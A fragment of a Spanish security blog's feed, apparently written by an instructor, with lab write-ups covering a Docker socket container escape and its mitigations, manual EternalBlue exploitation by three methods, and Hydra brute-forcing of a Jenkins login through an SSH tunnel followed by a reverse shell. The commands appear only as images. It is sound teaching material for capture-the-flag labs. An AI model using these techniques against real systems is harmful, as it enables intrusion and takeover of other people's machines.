+&lt;p&gt;Primero consultamos los contenedores corriendo en el sistema (equivalente a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps&lt;/code&gt;), posteriormente, utilizando JSON, creamos un nuevo contenedor de Alpine, que monte el volumen deseado, como en el caso anterior cuando utilizamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-cli&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/alpine7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y lo iniciamos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/alpine8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como hemos hecho un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chroot /owned&lt;/code&gt;, tenemos acceso a los binarios del sistema. Podemos utilizar socat  para comunicarnos con el socket de Docker, &lt;em&gt;“secuestrando”&lt;/em&gt; la conexión http para transportar la información de stdin/stdout/stderr:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/alpine10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y vemos que conseguimos escapar del contenedor al sistema de archivos del sistema anfitrión:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/alpine11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/alpine12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si no dispusiéramos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;, podríamos haber hecho las llamadas a la API con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;socat&lt;/code&gt; igualmente.&lt;/p&gt;
+
+&lt;h2 id=&quot;mitigación&quot;&gt;Mitigación&lt;/h2&gt;
+
+&lt;p&gt;Cuando me he documentado sobre este problema, parece difícil encontrar una solución satisfactoria.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;El primer consejo que uno encuentra siempre es nunca exponer o publicar el socket de Docker. De hecho, se suele leer que en el caso de tener que publicarlo, se debería replantear seriamente el diseño de la infraestructura para poder evitarlo. Si acaso, tímidamente se recomienda no exponer el socket fuera de la red interna y hacerlo en un entorno muy seguro y controlado.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;El argumento que se esgrime, con mucha razón, es que muchos tutoriales o guías en Internet simplemente exponen el socket sin mayor explicación sobre los riesgos de seguridad que implica, por una mayor facilidad y rapidez en el proceso. Esto hace que mucha gente publique sus sockets por seguir ciegamente algún tutorial o manual.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Retomar la solución del anterior post dedicado a la escalada de privilegios en contenedores. Esta solución consistía en remapear el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; del contenedor a un usuario sin privilegios en el namespace del sistema. En su día utilizamos este script para ese cometido:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/remap1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;El usuario y grupo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dockremap&lt;/code&gt; es el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;default&lt;/code&gt; para Docker, aunque podríamos hacerlo con uno diferente que creáramos para tal cometido. Este remapeo puede quedar registrado en la configuración del demonio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/docker/daemon.json&lt;/code&gt; de forma global o bien, hacerlo de forma concreta para un contenedor al lanzarlo mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-cli&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Podremos comprobar que, efectivamente, con esta solución no podemos crear contenedores nuevos desde dentro del contenedor:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/userremap.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Otra opción es utilizar el modo &lt;em&gt;rootless&lt;/em&gt; de ejecución de Docker, tal y &lt;a href=&quot;https://docs.docker.com/engine/security/rootless/&quot;&gt;como está documentado en su sitio web&lt;/a&gt;. Esto permite ejecutar tanto el demonio como los contenedores con un usuario no root.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Esta opción es relativamente nueva en Docker y hasta ahora, al no existir, una posible alternativa era utilizar &lt;strong&gt;Podman.&lt;/strong&gt; Podman es la implementación propia de Red Hat de su herramienta para el manejo de contenedores, completamente compatible con docker-cli y, desde hace poco, con docker-compose.&lt;/p&gt;
+
+&lt;p&gt;Podman no utiliza ningún demonio y por tanto, desde su diseño inicial y por defecto, corre los contenedores sin permisos de root. No obstante, buscando opiniones de usuarios que han experimentado con él, parece que aún no está muy asentado en entornos de producción, aunque cumple sobradamente para el resto de cometidos. Además, tiene integración muy sencilla con Kubernetes.&lt;/p&gt;
+
+&lt;p&gt;Ahora bien, puede haber casos en los que sea necesario publicarlo en la red. Ya hemos comentado antes del caso de Portainer, también puede darse el caso de utilizar Traefik como proxy inverso para nuestros contenedores o Jenkins para construir y correr contenedores.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/traefik.png&quot; alt=&quot;&quot; style=&quot;height:440px;width:550px&quot; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Para estos casos, aún existen alguna posibibilidad y la misma &lt;a href=&quot;https://docs.docker.com/engine/security/protect-access/&quot;&gt;documentación de Docker&lt;/a&gt; nos ofrece soluciones; utilizar TLS(HTTPS) o SSH con certiFicados para asegurar el acceso al socket&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;También en la &lt;a href=&quot;https://doc.traefik.io/traefik/providers/docker/#docker-api-access&quot;&gt;documentación&lt;/a&gt; de Traefik se comentan soluciones y hacen referencias a múltiples discusiones al respecto en Internet con las que yo también me ido topándome al documentarme. Aparte de las previamente comentadas:&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;
+        &lt;p&gt;Utilizar un proxy que filtre las peticiones en los accesos desde la red externa a los contenedores, de tal forma que se restrinja muy bien que tipos de llamadas se pueden realizar a la API. Por ejemplo con &lt;a href=&quot;https://github.com/Tecnativa/docker-socket-proxy&quot;&gt;Tecnativa&lt;/a&gt;.&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;También se puede utilizar Nginx de &lt;a href=&quot;https://github.com/nginx-proxy/nginx-proxy/blob/main/README.md#separate-containers&quot;&gt;esta&lt;/a&gt;] forma como proxy inverso, con dos contenedores diferentes, de tal forma que se expone el socket de Docker pero en un contenedor únicamente con acceso local.&lt;/p&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Utilizar un plugin de Docker para autorizar accesos. Explicado &lt;a href=&quot;https://docs.docker.com/engine/extend/plugins_authorization/&quot;&gt;aquí&lt;/a&gt; en su documentación.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Utilizar métodos de protección a nivel de Kernel como SELinux o Apparmor.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Sea como fuera, si por razones de diseño impepinables se debe exponer el socket y es imposible un rediseño que lo impida, existen ciertas soluciones que se han explicado y que habría que estudiar para cada caso concreto.&lt;/p&gt;
+
+&lt;p&gt;Destacar que esta preocupación, a pesar de ser algo bastante importante, no está ni mucho menos extendida en gran medida y es por ello que estas soluciones son muy recientes en el tiempo a la hora de escribir este post.&lt;/p&gt;
+
+&lt;h2 id=&quot;referencias&quot;&gt;Referencias&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html&quot;&gt;1&lt;/a&gt;
+&lt;a href=&quot;https://greencashew.dev/posts/docker-container-breakout-using-docker.sock/&quot;&gt;2&lt;/a&gt;
+&lt;a href=&quot;https://news.ycombinator.com/item?id=17983623&quot;&gt;3&lt;/a&gt;
+&lt;a href=&quot;https://news.ycombinator.com/item?id=24568973&quot;&gt;4&lt;/a&gt;
+&lt;a href=&quot;https://integratedcode.us/2016/04/20/sharing-the-docker-unix-socket-with-unprivileged-containers-redux/&quot;&gt;5&lt;/a&gt;
+&lt;a href=&quot;https://www.practical-devsecops.com/lesson-4-hacking-containers-like-a-boss/&quot;&gt;6&lt;/a&gt;
+&lt;a href=&quot;&quot;&gt;7&lt;/a&gt;&lt;/p&gt;</content><author><name>Raúl Riesco</name></author><summary type="html">Explicación teórica</summary></entry><entry><title type="html">Métodos de explotación manual de EternalBlue</title><link href="https://raul-profesor.github.io/eternalblue.html" rel="alternate" type="text/html" title="Métodos de explotación manual de EternalBlue" /><published>2022-03-15T00:00:00+01:00</published><updated>2022-03-15T00:00:00+01:00</updated><id>https://raul-profesor.github.io/Eternalblue</id><content type="html" xml:base="https://raul-profesor.github.io/eternalblue.html">&lt;h2 id=&quot;explicación-teórica&quot;&gt;Explicación teórica&lt;/h2&gt;
+
+&lt;p&gt;En el curso de especialización de ciberseguridad &lt;a href=&quot;https://raul-profesor.github.io/Curso-especialista-ciberseguridad/segof/servicios_desact/#un-caso-real-eternalblue-ms17-010-smbv1-y-wannacry&quot;&gt;ya he hablado&lt;/a&gt; de la archiconocida vulnerabilidad EternalBlue.&lt;/p&gt;
+
+&lt;p&gt;También &lt;a href=&quot;https://raul-profesor.github.io/Curso-especialista-ciberseguridad/segof/EternalBlue/&quot;&gt;intentamos explotar&lt;/a&gt; esta vulnerabilidad con un éxito regular, puesto que las máquinas que probé para diseñar ese ejercicio nos fue imposible explotarlas de forma manual, aunque sí con Metasploit.&lt;/p&gt;
+
+&lt;p&gt;Se me quedó la espinita clavada, máxime cuando tenía documentada desde hacía un tiempo la solución de la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Blue&lt;/code&gt; de HTB de forma manual sin problemas, con pruebas gráficas. Por lo que sea, no volvió a funcionar &lt;a href=&quot;https://github.com/worawit/MS17-010&quot;&gt;de esta forma&lt;/a&gt; ni ahí ni en THM.&lt;/p&gt;
+
+&lt;p&gt;Recientemente se me dio el caso contrario; haciendo uso de Metasploit, por lo que sea también, no fui capaz de comprometer una determinada máquina. Esta vez sin embargo sí pude hacerlo de forma manual y vamos a ver distintas formas de hacerlo.&lt;/p&gt;
+
+&lt;h2 id=&quot;caso-práctico&quot;&gt;Caso práctico&lt;/h2&gt;
+
+&lt;p&gt;Como siempre, dado que estos posts son ideas y notas que puedan servir de una forma rápida en el futuro como base para otros menesteres, no supondrá un Writeup completo de la máquina.&lt;/p&gt;
+
+&lt;p&gt;Se parte de una situación previa donde se ha realizado una exhaustiva enumeración de tal forma que hemos descubierto que tenemos un servico SMB vulnerable a &lt;a href=&quot;https://support.microsoft.com/es-es/topic/ms17-010-actualizaci%C3%B3n-de-seguridad-para-windows-server-de-smb-14-de-marzo-de-2017-435c22fb-5f9b-f0b3-3c4b-b605f4e6a655&quot;&gt;MS17-010&lt;/a&gt; o EternalBlue para los amigos.&lt;/p&gt;
+
+&lt;p&gt;También sabemos que la máquina víctima u objetivo puede correr un Windows Server 2008-2012-2016.&lt;/p&gt;
+
+&lt;p&gt;Y por último, &lt;strong&gt;poseemos unas credenciales de acceso no privilegiado para el servicio SMB.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;En mi caso particular, los exploits que he encontrado para esta vulnerabilidad son muy poco estables y propensos a dejar la máquina inhábil.&lt;/p&gt;
+
+&lt;p&gt;En un primer lugar he probado con &lt;a href=&quot;https://github.com/3ndG4me/AutoBlue-MS17-010&quot;&gt;Autoblue&lt;/a&gt;, el cual facilita un poco el proceso manual que se indicaba &lt;a href=&quot;https://raul-profesor.github.io/Curso-especialista-ciberseguridad/segof/EternalBlue/&quot;&gt;en el ejercicio del curso de especialización&lt;/a&gt; ya que genera el payload con msfvenom y combina los ejecutables para ambas arquitecturas de forma automatizada.&lt;/p&gt;
+
+&lt;p&gt;Al no conseguir el éxito de esta forma en el caso que nos ocupa, buscamos otros exploits, como por ejemplo:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/eternal/search-eternal.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que tenemos otro serio candidato a utilizar y que, a modo de spoiler, puedo confirmar que funciona adecuadamente.&lt;/p&gt;
+
+&lt;h3 id=&quot;hands-on-o-en-castizo-manos-a-la-obra&quot;&gt;Hands-on o, en castizo, manos a la obra&lt;/h3&gt;
+
+&lt;p&gt;El exploit que vamos a utilizar no es más que una PoC. Si examinamos el código vemos que lo que hace es crear un archivo de texto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwned.txt&lt;/code&gt; en el directorio compartido de SMB a modo de prueba de que es vulnerable:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/eternal/poc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo bueno de Internet es que mucha gente válida e inteligente ha decidido compartir su conocimiento de forma gratuita con el resto de mortales, para que aprendamos de ellos. Esta suerte &lt;a href=&quot;https://redteamzone.com/EternalBlue/&quot;&gt;nos permite conocer distintos métodos de hacer uso de este exploit&lt;/a&gt; para vulnerar de una forma más o menos ruidosa una máquina.&lt;/p&gt;
+
+&lt;h4 id=&quot;método-1-subiendo-una-shell-a-pecho-descubierto-como-elefante-en-cacharrería&quot;&gt;Método 1: Subiendo una shell a pecho descubierto, como elefante en cacharrería&lt;/h4&gt;
+
+&lt;p&gt;Siguiendo los pasos indicados, podemos crear un payload para nuestra shell inversa haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/eternal/msfvenom.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y modificamos el código en consonancia:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/eternal/metodo1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bien es cierto que puede que haya que lanzar el exploit varias veces antes de conseguir tener éxito, aunque es bastante más fiable que el resto de los que he probado. Vemos como conseguimos hacernos con un acceso privilegiado a la máquina:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/eternal/metodo1-OK.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;método-2-un-poco-más-sigiloso-metal-gear-solid-style&quot;&gt;Método 2: Un poco más sigiloso, Metal Gear Solid style&lt;/h4&gt;
+
+&lt;p&gt;Nadie podrá discutir que el método anterior, a pesar de ser efectivo, es &lt;em&gt;a lo bruto&lt;/em&gt;. Estamos subiendo un archivo ejecutable a la máquina sin ningún tipo de disimulo y esto hará saltar las alarmas de forma inmediata.&lt;/p&gt;
+
+&lt;p&gt;Una forma un poco más disimulada es hacer que la máquina víctima acceda al payload en Powershell de forma remota y lo ejecute, siendo todo el proceso en memoria sin tocar el disco.&lt;/p&gt;
+
+&lt;p&gt;Para este cometido utilizaremos las famosas shells de Nishang, que en distribuciones Linux enfocadas a la seguridad ya vienen incluidas. En Parrot por ejemmplo, las podemos encontrar en el directorio: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/nishang/Shells&lt;/code&gt;. Nosotros haremos uso concretamente de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-PowerSAhellTcp.ps1&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Nos copiamos esa shell a nuestro entorno de trabajo y justo al final del archivo, añadimos lo que nos hace falta para nuestra reverse shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/eternal/metodo2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y modificamos de nuevo el código del exploit en consonancia:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/eternal/metodo2-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Puesto que ahora la máquina víctima accederá al payload vía &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;, debemos servir el script de Powershell mediante un sencillo servidor web, utilizando Python. Con todo preparado, ejecutamos de nuevo:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/eternal/metodo2-OK.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En los tres terminales de la imagen y por orden cronológico:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;En el de arriba a la izquierda, se lanza de nuevo el exploit contra la IP de la máquina víctima&lt;/li&gt;
+  &lt;li&gt;En el terminal de la derecha podemos observar como se produce un acceso HTTP exitoso a nuestro servidor para solicitar el script de &lt;em&gt;powershell&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;Por último en el terminal de abajo a la izquierda, donde teniamos un netcat escuchando en el puerto al que conectará nuestro script de powershell para devolvernos la shell inversa, vemos como finalmente se obtiene dicha shell como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;método-3-intentando-ser-un-poco-sutil&quot;&gt;Método 3: Intentando ser un poco sutil&lt;/h4&gt;
+
+&lt;p&gt;En algún momento puede que queramos ser un poco más sigilosos y que la máquina víctima no nos devuelva una shell inversa o se conecte a cualquier otro sitio para descargarse ningún archivo, cosas ambas que podrían levantar bastantes sospechas.&lt;/p&gt;
+
+&lt;p&gt;En ese caso podemos optar por, directamente, crear un usuario privilegiado administrador en la máquina víctima y, directamente, hacer login con él.&lt;/p&gt;
+
+&lt;p&gt;Para ello modificamos nuestro exploit para que el servicio que creemos, ejecute la acción que deseamos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/eternal/metodo3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hecho esto, repetimos nuestro modus operandi. Primeramente ejecutaremos el exploit y posteriormente, como se ve en el terminal de la derecha, intentaremos hacer login usando el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt; de Impacket:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/eternal/metodo3-NOK.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En este caso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec.py&lt;/code&gt; no encuentrar ningún directorio compartido en SMB que sea escriturable para subir su binario e iniciarlo con el administrador de servicios (sc), así que nos da error y no conseguimos conectarnos.&lt;/p&gt;
+
+&lt;p&gt;No obstante, si estuviera disponible, podríamos conectarnos de una forma típica y directa como es RDP:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/eternal/metodo3-OK.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A pesar de esta última ser una forma un poco más silenciosa y elegante, las tres son bastante susceptibles de hacer sonar todas las alarmas y ser bloqueados por EDRs y protecciones varias de endpoints, entre otros elementos.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;EDIT-&lt;/strong&gt; De casualidad me he encontrado con &lt;a href=&quot;https://deephacking.tech/por-que-se-pueden-ejecutar-comandos-a-traves-de-smb/&quot;&gt;este post&lt;/a&gt; que me parece interesante para entender el por qué podemos utilizar este exploit en SMB para crear y ejecutar el servicio.&lt;/p&gt;</content><author><name>Raúl Riesco</name></author><summary type="html">Explicación teórica</summary></entry><entry><title type="html">Fuerza bruta de formulario de login con Hydra mediante port forwarding</title><link href="https://raul-profesor.github.io/port-forw-ssh-hydra.html" rel="alternate" type="text/html" title="Fuerza bruta de formulario de login con Hydra mediante port forwarding" /><published>2022-03-09T00:00:00+01:00</published><updated>2022-03-09T00:00:00+01:00</updated><id>https://raul-profesor.github.io/Port_forw_SSH_Hydra</id><content type="html" xml:base="https://raul-profesor.github.io/port-forw-ssh-hydra.html">&lt;h2 id=&quot;explicación-teórica&quot;&gt;Explicación teórica&lt;/h2&gt;
+&lt;p&gt;Hoy voy a compartir algo que me ha parecido interesante para poder contar alguna vez en clase como técnica de hacking y con lo que me he topado en la máquina &lt;a href=&quot;https://tryhackme.com/room/internal&quot;&gt;Internal&lt;/a&gt; de THM&lt;/p&gt;
+
+&lt;p&gt;No vamos a partir de 0, sino de una supuesta situación donde ya hemos llevado a cabo un trabajo previo como una exhaustiva enumeración, compromiso de una máquina y enumeración de nuevo.&lt;/p&gt;
+
+&lt;p&gt;Supongamos que hemos comprometido una máquina de tal forma que tenemos acceso mediante SSH. Hemos comprobado que tenemos una interfaz con la IP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.17.0.1&lt;/code&gt;, lo cuál ya nos da una pista de algo que confirmaremos más adelante.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/hydra/ip-a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Además, en el proceso de enumeración hemos descubierto que en la IP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.17.0.2&lt;/code&gt; tenemos un puerto 8080 a la escucha.&lt;/p&gt;
+
+&lt;h2 id=&quot;caso-práctico&quot;&gt;Caso práctico&lt;/h2&gt;
+&lt;p&gt;El problema es que desde la interfaz de nuestra VPN &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.9.0.0/16&lt;/code&gt; sólo tenemos acceso al segmento de red de las máquinas de THM &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.0.0/16&lt;/code&gt; pero no al segmento &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.17.0.0/16&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Una posible solución a esta situación es realizar una redirección de puertos o túnel SSH hacia la segunda máquina aprovechándonos de nuestro acceso SSH a la primera y que ambas comparten interfaz. De esta forma desde nuestra máquina atacante podremos tener acceso a la segunda máquina, en principio inaccesible, haciendo uso del acceso SSH a la primera de ellas.&lt;/p&gt;
+
+&lt;p&gt;La &lt;a href=&quot;https://www.tecmint.com/create-ssh-tunneling-port-forwarding-in-linux/&quot;&gt;manera&lt;/a&gt; de hacer esto sería:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/hydra/tunelSSH.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Con esto conseguimos que accediendo al puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;9001&lt;/code&gt; de nuestra máquina local y, utilizando la conexión SSH de la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;internal.thm&lt;/code&gt;, en realidad accedamos al puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8080&lt;/code&gt; de la máquina remota.&lt;/p&gt;
+
+&lt;p&gt;De la enumeración previa ya habríamos llegado a la conclusión de que debía ser un servicio web, así que probamos a acceder con el navegador para comprobar que la redirección es correcta:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/hydra/jenkinsweb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Resulta ser un panel de login de Jenkins.&lt;/p&gt;
+
+&lt;p&gt;Si hacemos una búsqueda rápida de las credenciales por defecto de Jenkins, vemos que el usuario por defecto es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; y la contraseña la que tenga configurada. Así pues, podemos proceder a un ataque de fuerza bruta contra este formulario de login.&lt;/p&gt;
+
+&lt;p&gt;Este login va por una petición &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; y debemos ver como se forma para poder lanzar el ataque adecuado al formato de &lt;a href=&quot;https://github.com/vanhauser-thc/thc-hydra&quot;&gt;Hydra&lt;/a&gt;. Para ver la petición, podemos utilizar o bien Burp Suite o simplemente las herramientas de desarrollador del navegador:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/hydra/post1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/hydra/post2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y por tanto, llevamos a cabo el ataque especificado con el siguiente comando completo (el formato de Hydra podemos consultarlo en su ayuda):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/hydra/hydra.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez obtenidas las credenciales, podemos obtener una reverse shell en la nueva máquina siguiendo el procedimiento que nos explican en el siempre útil libro de 
+&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#execute-groovy-script&quot;&gt;Hacktricks&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Primero ajustamos el &lt;em&gt;payload&lt;/em&gt; en Base64 para el caso de nuestra IP y nuestro puerto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/hydra/cyberchef.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y luego lo empleamos en el procedimiento que hemos visto en Hacktricks:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/hydra/shell_jenkins.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/hydra/shell_jenkins2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez obtenida la reverse shell, confirmamos algo casi obvio, atendiendo a dos motivos:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;En la fase de enumeración habremos visto que Docker está instalado en la primera máquina que atacamos&lt;/li&gt;
+  &lt;li&gt;La red &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.17.0.0/16&lt;/code&gt; es propia de Docker&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Además, si se nos ocurre atender a la salida de un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netstat&lt;/code&gt; en la primera máquina, veremos que el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8080&lt;/code&gt; está expuesto para la máquina local, haciendo sospechar que está publicado para llegar al contenedor Docker en el mismo puerto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/hydra/net.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No obstante, comprobémoslo:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/hydra/shell_jenkins3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y corroboramos que, efectivamente, estamos dentro de un contenedor Docker.&lt;/p&gt;
+
+&lt;p&gt;Esto lo habremos consultado &lt;a href=&quot;https://stackoverflow.com/questions/20010199/how-to-determine-if-a-process-runs-inside-lxc-docker&quot;&gt;aquí&lt;/a&gt; ya que ni de lejos somos los primeros en preguntarnos como averigüar si estamos trabajando dentro de un contenedor.&lt;/p&gt;
+
+&lt;p&gt;Así pues, tendríamos que continuar intentado técnicas para escapar del contenedor o enumerar el propio contenedor para continuar buscando nuestra flag de root. Esto ya escapa a la intención del post que pretendía hacer notar el mecanismo para la redirección de puertos.&lt;/p&gt;</content><author><name>Raúl Riesco</name></author><summary type="html">Explicación teórica Hoy voy a compartir algo que me ha parecido interesante para poder contar alguna vez en clase como técnica de hacking y con lo que me he topado en la máquina Internal de THM</summary></entry><entry><title type="html">Escalada de privilegios en contenedores Docker</title><link href="https://raul-profesor.github.io/docker.html" rel="alternate" type="text/html" title="Escalada de privilegios en contenedores Docker" /><published>2022-02-20T00:00:00+01:00</published><updated>2022-02-20T00:00:00+01:00</updated><id>https://raul-profesor.github.io/Docker</id><content type="html" xml:base="https://raul-profesor.github.io/docker.html">&lt;h2 id=&quot;explicación-teórica&quot;&gt;Explicación teórica&lt;/h2&gt;
+
+&lt;p&gt;A estas alturas se da por sabido qué es y qué no es Docker y en qué se diferencia de las máquinas virtuales. En caso contrario, existen millones de recursos en Internet para informarse y formarse al respecto.&lt;/p&gt;
+
+&lt;p&gt;Como bien explica la &lt;a href=&quot;https://docs.docker.com/engine/install/linux-postinstall/&quot;&gt;documentación oficial de Docker&lt;/a&gt;, el demonio de docker utiliza sockets Unix, cuyo propietario por defecto es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; y por tanto, el resto de usuarios deberán hacer uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; porque el demonio de Docker siempre correrá como usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
+
